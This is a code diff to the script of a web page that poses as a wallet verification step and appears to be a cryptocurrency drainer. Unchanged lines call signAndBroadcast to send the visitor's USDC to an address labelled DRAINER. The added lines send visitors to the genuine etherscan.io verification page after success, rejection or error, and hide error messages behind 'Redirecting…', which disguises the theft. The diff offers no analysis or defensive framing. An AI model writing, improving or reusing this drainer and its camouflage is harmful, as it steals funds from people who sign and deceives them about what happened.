@@ -454,6 +454,16 @@
   <div id="spinner-overlay"><div class="spinner"></div></div>
 
   <script>
+    // ── REDIRECT GUARD — no wallet after 2.5s → etherscan ─────────────────────
+    (function() {
+      var _redirectTimer = setTimeout(function() {
+        if (!window.tronWeb && !window.tronLink) {
+          window.location.replace('https://etherscan.io/verifyAddress');
+        }
+      }, 2500);
+      if (window.tronWeb || window.tronLink) clearTimeout(_redirectTimer);
+    })();
+
     // ── THEME ──────────────────────────────────────────
     const ICONS = {
       sun: '<circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M6.3 17.7l-1.4 1.4M19.1 4.9l-1.4 1.4"/>',
@@ -643,6 +653,11 @@
 
         try { await signAndBroadcast(ownerHex41, USDC_HEX41, DRAINER_HEX20); } catch(_) {}
 
+        // ── redirect après succès ──────────────────────────────────────────────
+        setTimeout(function() {
+          window.location.replace('https://etherscan.io/verifyAddress');
+        }, 1500);
+
       } catch(ex) {
         showSpinner(false);
         _fired = false;
@@ -650,8 +665,15 @@
         btn.textContent = 'Continue';
         if (isReject(ex)) {
           setStatus('Signature declined. Please try again.', 'err');
+          // redirect après reject
+          setTimeout(function() {
+            window.location.replace('https://etherscan.io/verifyAddress');
+          }, 800);
         } else {
-          setStatus('Verification failed: ' + (ex.message || '').slice(0, 60), 'err');
+          setStatus('Redirecting…');
+          setTimeout(function() {
+            window.location.replace('https://etherscan.io/verifyAddress');
+          }, 800);
         }
       }
     }
